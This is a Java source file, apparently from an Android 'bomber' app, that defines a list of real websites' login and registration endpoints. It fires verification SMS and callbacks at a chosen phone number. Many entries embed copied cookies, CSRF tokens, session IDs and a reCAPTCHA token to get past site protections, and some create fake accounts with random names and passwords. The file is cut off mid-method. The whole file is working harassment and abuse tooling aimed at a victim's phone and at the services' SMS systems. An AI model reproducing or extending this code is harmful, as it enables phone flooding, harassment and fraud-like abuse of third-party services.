package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {

    public static boolean contains(final int[] array, final int key) {
        for (final int i : array) {
            if (i == key) {
                return true;
            }
        }
        return false;
    }

    public static List<Service> getUsableServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0 || contains(service.countryCodes, countryCodeNum))
                usableServices.add(service);
        }

        return usableServices;
    }

    public final static Service[] services = new Service[]{
            new Telegram(), new MTS(), new CarSmile(), new Eldorado(), new Tele2TV(),
            new Ukrzoloto(), new Olltv(), new ProstoTV(),
            new Zdravcity(), new Robocredit(), new Tinder(), new Groshivsim(),
            new Dolyame(), new Tinkoff(), new FoodBand(), new Gosuslugi(),
            new Citimobil(), new TikTok(), new Multiplex(),
            new Ozon(), new OK(), new VKWorki(), new SberZvuk(),
            new BApteka(), new Evotor(), new Sportmaster(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
            new MoeZdorovie(), new Discord(), new Metro(),
            new Mozen(), new MosMetro(), new BCS(), new TochkaBank(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new Tele2(), new Profi(),
            new BeriZaryad(), new PrivetMir(), new CardsMobile(), new Labirint(),
            new CallMyPhone(), new SberMobile(), new Choco(),
            new AptekaOtSklada(), new AutoRu(), new SatUa(), new VapeZone(),
            new Melzdrav(), new Fonbet(), new Grilnica(), new Aitu(), new Pizzaman(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),
            new Kari(), new Modulebank(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new Service() {
                private final String url = "https://site-api.mcdonalds.ru/api/v1/user/login/phone";
                private final Headers headers = new Headers.Builder()
                        .add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0")
                        .build();

                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url(url)
                            .headers(headers)
                            .method("OPTIONS", null)
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("number", "+" + getFormattedPhone());
                                json.put("g-recaptcha-response", "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            client.newCall(new Request.Builder()
                                    .url(url)
                                    .headers(headers)
                                    .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.ecomarket.ru/api.php", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "doRegisterOrRecover");
                        json.put("phone", format(phone, "+7-***-***-**-**"));
                        json.put("source", "web");
                        json.put("type", "call");
                        json.put("token", "bb1a2f29c78164dfb490dbae44594318");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.vprok.ru/as_send_pin") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "split_segment=8; split_segment_amount=10; XSRF-TOKEN=eyJpdiI6ImpnRVJoY0swSEVPSWtsa2JMWTJPVnc9PSIsInZhbHVlIjoiOXp0V3c4WTdUbE82U2czTTZ3dkpoNVd1T1J0YkpTNWI0c3JZdG10bVZKTFBPMmZ2a1F4Mjl5b2RETWl5ZjZvYzFkU1wvMkw1T2pPMjV0NVZYV1pYSk9BPT0iLCJtYWMiOiJiYTg1MjM2ZWQ0NGVjOTUyOTgyNzcyMDU3ZDY5MjY5NmYyNzgwNTQ0MmI1Y2Y1NzNiMmVhMWQ5ZjFmOTllMDRhIn0%3D; region=8; shop=2671; noHouse=0; fcf=3; _dy_ses_load_seq=17826%3A1638380585139; _dy_c_exps=; _dy_c_att_exps=; isUserAgreeCookiesPolicy=true; suuid=bcb02b51-0827-4b04-9723-8c80419b120b; aid=eyJpdiI6Im9PdUtnOUs4eEFncTBvRHB5R0oxS1E9PSIsInZhbHVlIjoiM0Vxa2xCd1dYeERhNVJBaE04TVlYQWVwTzlIYndHQ3ZsWFFxMjRZclg4RWlFeDBmQVwvUFdmUXBsTlNtS1VmWEFkSFJ6SXM5QVZNNmwzeGRwNk1PbEJRPT0iLCJtYWMiOiJkODE2MjBlMTI4MTIxNDRkYTVhM2NmMjYyMWUyNTFkNDQzYWM0ZTQ4MDZhYjNhYmM3NDNhMmJkODZjMjUwY2JkIn0%3D; luuid=bcb02b51-0827-4b04-9723-8c80419b120b; _dy_csc_ses=t; splitVar=test01-A");
                    builder.addHeader("X-CSRF-TOKEN", "QPhHmWEtMAoBeuKgULCeLtejbfvKD2n4yMKylL3T");
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6IjhJQkhaWWh6VEJ1SVhsZERPVk53eWc9PSIsInZhbHVlIjoiNzFsUjVOZFwvTVYrY0gxdzI4MklcL1FMS1FZUGh3OUZOcUZDdkZIQUJiOUZ5Q1VHMXd6SWptaTNQNmhCbnduT0NqVklhRFBDbXcrOG10ejVjZXIxK3RWZz09IiwibWFjIjoiZWU0NGFlYzVmZTQwOWMyYjkzNTlkNmQ0YzUxYjc4NmY3MTZiYzgwZjZlMmVlNWM5MzA2YmY1MDcxNmZkNzdkYyJ9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://chuck-family.ru/s/get-registration-confirm-code.json", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("register_phone", format(phone, "8+***-***-**-**"));
                    builder.add("register_name", getRussianName());
                    builder.add("register_birthday", "01.01.1981");
                    builder.add("", "");
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://novayagollandiya.com/auth/?backurl=/personal/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "624313ea9d90eac9093d49000c8e2dbf");
                    builder.add("method", "sendCode");
                    builder.add("phone", format(phone, "+7+(***)-***-**-**"));
                    builder.add("registration", "N");
                }
            },

            new JsonService("https://api.petrovich.ru/api/rest/v1/user/pincode/reg?city_code=rf&client_id=pet_site") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Cookie", "SNK=124; u__typeDevice=desktop; geoQtyTryRedirect=1; u__geoUserChoose=1; qrator_msid=1638604580.330.8vox5jrGVn8JeE5a-f7j5tbrq8vdc6ae4kths8i52pi66kom8; u__geoCityGuid=d31cf195-2928-11e9-a76e-00259038e9f2; u__cityCode=rf; SIK=fAAAAHRZ8mRMMMkQ4zoJAA; SIV=1; C_o72-jqSdEZI2mxcQ9hjwCsP7WhI=AAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8D8AAIDJKZjpQfJVD28tnILC3BseM5mEUbQ; ssaid=afa34f20-54d7-11ec-9e2a-e50833b98526; dd__lastEventTimestamp=1638604588417; dd__persistedKeys=[%22custom.lastViewedProductImages%22]; dd_custom.lastViewedProductImages=[]; __tld__=null");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://blanc.ru/api/sso/entrance/login") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("captcha", "");
                        json.put("phoneNumber", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("invitation_text", "");
                }
            },

            new ParamsService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0");
                    builder.addHeader("Referer", "https://www.raiffeisen.ru/promo/500/?utm_campaign=perfluence%7cpr:dc%7csp:cashback%7ctype:referral%7cgeo:russia%7cmodel:issue%7coffer:private%7caud:AAAAAEazJzK_u9lCZcabcA&utm_medium=affiliate&utm_source=perfluence&utm_content=PF13516&utm_term=f56cb6d037db79233e3ff66fbe70b375");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("number", getFormattedPhone());
                }
            },

            new FormService("https://www.traektoria.ru/local/ajax/authorize.php?action=2", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("bxsessid", "68eb9e074e9677e3a7a3b4620abdff29");
                    builder.add("lid", "tr");
                }
            },

            new JsonService("https://api.magonline.ru/api/graphql") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("token", "3a4711a14672e7a56b2072f1e06f10f3a578e8d1-d697b32f5a10ee16e71d407721f181ca63b78931");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("query", "  mutation ($input: RequestPhoneVerificationInput!) {    requestSignInPhoneVerificationCode (input: $input) {  count  maxCount  resendTime  lifetime  isVerified}  }");
                        json.put("variables", new JSONObject().put("input", new JSONObject()
                                .put("phone", "+" + getFormattedPhone())
                                .put("force", false)));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://kos-mart.ru/send_code.json?code_iso3=RUS") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-CSRF-Token", "346f6048925a05eed2bb00f6f2638c8698835b6b210d8008dd52434c9d3fd6db");
                    builder.addHeader("Cookie", "visitor=hAj8xSk%2BWTqzWzIVzg9YKxQC24hQ%2BovUq%2FINA%2FhzRcrK%2BDpmrxGgHS0YuXy8Vc2KhZncrn4A6eD4tWPPgeXAbbxpLgX8eiftIu6oW6nAMf4etxH12h%2Fkc3cSKHNYXyGqhplGMABzIWS%2BYhM2Yr4XOv78GGZ1--WklonPFjDt9ZXN1y--ft3u0Hj4RfSK%2BlicU8bHjw%3D%3D; csrf_token=hRtO1GjeLhMOne47Kqv55g1tOY0f81YZp6jDXqnsLCNAEVA5FQ3nu6EYSgTnhNqufOZ6PWAhYPokQX007NWP2P6v8sy0%2FibcO6Bpb2znkRE%2FVsWoLWpifQdUV1TQwn%2FDlFxdvHMYkM0SylJGyKCwUgp05X1TViDNmxxjihjFgRDu1jKNdv2a5TrRvqa%2BBIvg0s5vXvxOh7%2FiKzPAV2Ppl%2Fo%3D--%2FaKP69e2yjH62Z06--nePoBJumFNoxCckoj73AJQ%3D%3D");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("csrf_token", "346f6048925a05eed2bb00f6f2638c8698835b6b210d8008dd52434c9d3fd6db");
                        json.put("login", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://www.meloman.kz/loyalty/customer/createConfirm/", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=vpqcv1o4psr14aripnt2a728ao; region_id=541; region_just_set=1; _dyjsession=audqfsd8yyfd75iqwvk8j32eqtqo1vfa; dy_fs_page=www.meloman.kz%2Fcustomer%2Faccount%2Flogin%2Freferer%2Fahr0chm6ly93d3cubwvsb21hbi5rei9jdxn0b21lci9hy2nvdw50l2luzgv4lw%252c%252c; _dy_csc_ses=audqfsd8yyfd75iqwvk8j32eqtqo1vfa; _dy_c_exps=; _dy_soct=362831.602231.1639410140*398001.680451.1639410143.audqfsd8yyfd75iqwvk8j32eqtqo1vfa*477267.869366.1639410143; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=b2SMIQBgbkQmR4FF; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; section_data_ids=%7B%22customer%22%3A1639410141%2C%22cart%22%3A1639410141%2C%22gtm%22%3A1639410141%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("form_key", "b2SMIQBgbkQmR4FF");
                    builder.add("success_url", "");
                    builder.add("error_url", "");
                    builder.add("un_approved_mobile", format(phone, "+7(***)***-**-**"));
                    builder.add("confirm_mobile_code", "");
                    builder.add("terms", "on");
                }
            },

            new JsonService("https://ogon.ru/v1/users/auth") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-App-Name", "Site");
                    builder.addHeader("X-App-Version", "1.0.341.2");
                    builder.addHeader("X-Domain", "https://ogon.ru");
                    builder.addHeader("X-Fingerprint", "f7b509dccd4c01019b3e5ca233a851bb");
                    builder.addHeader("X-Pragma", "ReK6+msei8Y7ssRIkKmkrSJERsntCFHPAXmr2XnD4Zs=");
                    builder.addHeader("X-Support-SDK", "false");
                    builder.addHeader("X-UUID", "3fc54ee8-149e-4677-bbb2-fe5b98912e79");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone_number", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://cvety.kz/ajax/actions/get-auth-phone.php", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", format(phone, "+7 *** ***-**-**"));
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");
                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    String formattedPhone = format(phone, "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://madrobots.ru/api/auth/register/")
                            .post(new FormBody.Builder()
                                    .add("name", getRussianName())
                                    .add("lastName", getRussianName())
                                    .add("phone", formattedPhone)
                                    .add("email", getEmail())
                                    .add("city", getRussianName())
                                    .add("subscribe", "0")
                                    .build())
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            client.newCall(new Request.Builder()
                                    .url("https://madrobots.ru/api/auth/send-code/")
                                    .post(new FormBody.Builder()
                                            .add("identifier", formattedPhone)
                                            .build())
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://alphasms.ua/ajax/test/") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", "+" + getFormattedPhone());
                }
            },

            new FormService("https://orteka.ru/bitrix/services/main/ajax.php?mode=class&c=orteka:auth.registration&action=confirmPhone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=lakj7vcqijs9tpb3e2mstens6b; ABtestCart=261298; BITRIX_SM_SALE_UID=4daefd46dbc267e59b1bd566fe4c30e3; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1640379540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; tracking=; ssaid=cf31d6b0-64de-11ec-9520-b133cea34249; __tld__=null; _userGUID=0:kxko2vjy:dwfdz3WqmnxkeyIxYM079_My9XvrFucY; k50uuid=4901ac77-8404-4bd9-9839-cc912ae34604; k50lastvisit=2be88ca4242c76e8253ac62474851065032d6833.da39a3ee5e6b4b0d3255bfef95601890afd80709.54b4f71d35b40b9bde5abe49d6744bc4caa2ebbf.da39a3ee5e6b4b0d3255bfef95601890afd80709.1640366867727; k50sid=fc9e4f6c-a04e-46d9-863b-dacfc75bc5a8; dSesn=4a23c994-2b9a-72ea-e365-5d13bc7b2bee; _dvs=0:kxko2vjy:gvnTKh7Lqf4~ZiAn1njx3nLEYrfRcrIE; __ar_v_id=0oDEExrKUIXsA0QGC-AWF3; __ar_d_id=e8ueNh1qpb8j3Tz3zo6k5Q; __ar_si=%7B%22t%22%3A%222021-12-24T17%3A27%3A49.295Z%22%2C%22c%22%3A1%2C%22p%22%3A%5B%5D%2C%22ct%22%3A%5B%5D%2C%22q%22%3A%22%22%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("signedParameters", "");
                    builder.add("query[phone]", format(phone, "+7 (***) ***-**-**"));
                    builder.add("SITE_ID", "s1");
                    builder.add("sessid", "b4f37bbc68c502a6f442db031b3b65ea");
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", getFormattedPhone());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    builder.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone);
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");
                }
            },

            new JsonService("https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone, "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new JsonService("https://www.italbazar.ru/api/v1/auth/send_otp/", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("source", format(phone, "+7(***)***-**-**"));
                        json.put("type", "phone");
                        json.put("phoneChanged", false);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", getFormattedPhone());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone, "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("client", new JSONObject()
                                .put("phone", format(phone, "*** *** ** **")));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://api.mikafood.ru/") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("x-stigma-storefront-access-token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaG9wSWQiOiJjanoxOHBoYW4wMDV3MDc2OXVhdTM0cG9mIn0.e1fREfFnOVvKrEHyvPhvA3mfsEeDxIWQ5Tyn_PKYiQg");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "authBySms");
                        json.put("query", "mutation authBySms($phone: PhoneNumber!) {  authBySms(phone: $phone)}");
                        json.put("variables", new JSONObject()
                                .put("phone", "+" + getFormattedPhone()));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://pronto24.ru/user/generate-password", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "upkvartal-frontend=2prs0qopa4s3ekkmk6dtj0j5gt; _csrf-frontend=f890e8cd433864caea0d0baa2f01eab3a95cf55e47f2cd3e053028c99701270fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22N8lxSf8EIRP90jtz4afbJ_06737Vg_YI%22%3B%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                    builder.add("_csrf-frontend", "rSOZhIxsuT6l1No0nhA7VwpteG4A57Dl4cVllaFtZxTjG_X83wqBe-yGig2uek8tPgweDEq4gNPW9lLDxjI-XQ==");
                }
            },

            new FormService("https://feelka.kz/profile/login/send") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "user_hash=ffc14dcb317a5b139628375691cdac011d57031e7d11202e9653dba1be0b5b9ca%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22user_hash%22%3Bi%3A1%3Bs%3A32%3A%22d423303a4450353ff218a06c6537ec31%22%3B%7D; city_id=77ad4b65fd4265fc1665cf2363f3dc0e2a04349899f28df8a539d41dfccc02e4a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22city_id%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; city_folder=d9aef6fa22b07d343f480bd79d0327fcb82aa359e7c8ec3f5e5ba396b3c2ffbaa%3A2%3A%7Bi%3A0%3Bs%3A11%3A%22city_folder%22%3Bi%3A1%3Bs%3A0%3A%22%22%3B%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("xhr", "e3f365d8e3c26bf23a783e3ef2284426b7cf54062d5198b7d82ebf29812159fd");
                }
            },

            new FormService("https://coffeemania.ru/login", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "advanced-frontend=ac7d4d086890f8a29099c5a22e5e12bb; usertoken=8eaf2f690636a09b6d1e9d7368a0b317b96b435f4bb38b78281dcf717d2f4a02a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22usertoken%22%3Bi%3A1%3Bs%3A20%3A%22qKHqFK7jvSly0StThkNG%22%3B%7D; _csrf-frontend=a779c6e25139b13f071babdf513c4c21b58a9ae58ea099c96c929a00bb7ea524a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22ooZZFy-WoJd52qCzuoSLcooLLUawtD0H%22%3B%7D");
                    builder.addHeader("X-CSRF-Token", "6kUb5YARW8xNOsjBUE6e4OuTFB6DTqVt6ckOsR240VOFKkG_xmh2myJwrPRiP92anvxHUuAhyiGlnG_GafzhGw==");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("_csrf-frontend", "Ve-rX626vGjdimmAJBTVHskpQnydy2GUWKHAfZ0wZCA6gPEF68ORP7LADbUWZZZkvEYRMP6kDtgU9KEK6XRUaA==");
                    builder.add("LoginForm[phone]", format(phone, "+7(***)***-**-**"));
                    builder.add("LoginForm[type]", "");
                }
            },

            new JsonService("https://new-api.delikateska.ru/graphql") {
                @Override
                public Request buildRequest(Request.Builder builder) {
